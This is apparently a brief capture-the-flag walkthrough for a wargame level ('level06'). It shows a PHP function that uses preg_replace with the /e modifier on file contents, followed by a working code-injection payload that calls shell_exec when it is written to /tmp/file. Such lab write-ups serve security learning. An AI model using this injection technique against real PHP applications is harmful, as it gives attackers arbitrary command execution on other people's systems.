1- when you open the execution you will see its running the php file and take a file as aargument
2- so in this case you can write a regular expression in /tmp/file and then pass it to ./level06
a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
put it in this pattern
[x {\${shell_exec(getflag)}}]
